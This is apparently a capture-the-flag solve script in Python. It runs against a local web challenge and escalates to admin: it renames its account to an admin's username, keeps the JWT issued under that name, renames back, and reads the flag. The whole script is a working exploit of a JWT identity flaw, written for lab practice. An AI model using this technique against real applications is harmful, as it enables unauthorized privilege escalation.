#!/usr/bin/env python3

import requests
import re
import html

RHOST = "http://localhost:1337"

def solve():
    username = "bob"
    password = "password1"
    s = requests.Session()

    # Create a user
    r = s.post(
        f"{RHOST}/signup",
        data={"username": username, "password": password},
    )

    # Log in
    r = s.post(
        f"{RHOST}/login",
        data={"username": username, "password": password}
    )

    # Create an admin
    r = s.post(
        f"{RHOST}/create-admin"
    )
    admin_username = re.search(r"Admin '(.*)' created", html.unescape(r.text)).group(1)

    # Change our username to the admin's to shadow it
    r = s.post(
        f"{RHOST}/change-username",
        data={
            "newUsername": admin_username,
        }
    )

    # Log in to our account again to obtain a JWT with the admin username
    r = s.post(
        f"{RHOST}/login",
        data={"username": admin_username, "password": password}
    )
    jwt = s.cookies.get("shadow")


    # Change our username away from the admin's to unshadow them, but keep our JWT
    r = s.post(
        f"{RHOST}/change-username",
        data={
            "newUsername": username,
        }
    )
    s.cookies.set('shadow', jwt)

    # Now our JWT refers to the admin user, so we can read the flag
    r = s.get(
        f"{RHOST}/flag"
    )
    flag = re.search(r"(skbdg{.*})", html.unescape(r.text)).group(1)
    print(flag)

if __name__ == "__main__":
    solve()
